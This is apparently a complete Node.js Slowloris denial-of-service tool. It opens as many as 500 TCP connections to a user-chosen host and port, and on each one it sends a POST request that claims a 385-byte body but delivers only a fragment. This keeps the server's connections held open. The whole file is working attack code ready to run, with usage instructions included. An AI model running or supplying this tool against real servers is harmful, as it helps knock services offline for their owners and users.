#!/usr/bin/env node

const net = require("net");
const dnsSync = require('dns-sync');
const argv = require('minimist')(process.argv.slice(2));
const validIp = require('./util/validations').validIp
const validPort = require('./util/validations').validPort

const maxConnections = 500;
const connections = [];

const url = argv.url || argv.u;
const host = argv.host || argv.h || dnsSync.resolve(url);
const port = argv.port || argv.p || 80;
const timeout = argv.timeout || argv.t || 500;

class Connection {
  constructor(h, p) {
    this.h = h;
    this.p = p;

    this.state = "active";
    this.t = Date.now();

    this.client = net.connect({ port: p, host: h }, () => {
      //process.stdout.write("Connected, Sending... ");

      this.client.write(
        "POST / HTTP/1.1\r\nHost: " +
        host +
        "\r\n" +
        "Content-Type: application/x-www-form-urlenconded\r\n" +
        "Content-Length: 385\r\n\r\nvx=321&d1=fire&l"
      );

      //process.stdout.write("Written.\n");
    });
    this.client.on("data", data => {
      console.log("\t-Received " + data.length + " bytes...");
      this.client.end();
    });
    this.client.on("end", () => {
      const d = Date.now() - this.t;
      this.state = "ended";

      /* console.log(
        "\t-Disconnected (duration: " +
        (d / 1000).toFixed(3) +
        " seconds, remaining open: " +
        connections.length +
        ")."
      ); */
    });
    this.client.on("error", () => {
      this.state = "error";
    });

    connections.push(this);
  }
}

const slowLoris = () => setInterval(() => {
  let notify = false;

  // Add another connection if we haven't reached
  // our max:
  if (connections.length < maxConnections) {
    new Connection(host, port);
    notify = true;
  }

  // Remove dead connections
  connections.filter(function (v) {
    return v.state === "active";
  });

  if (notify) {
    process.stdout.clearLine();
    process.stdout.cursorTo(0);
    process.stdout.write(
      "Active connections: " + connections.length + " / " + maxConnections
    );
  }
}, 500);

if (host && port) {
  if (validIp(host) && validPort(port)) {
    slowLoris();
  } else {
    console.log("You have entered invalid host or port")
  }
} else {
  console.log("Usage: slowloris -h 127.0.0.1 -p 8080")
}

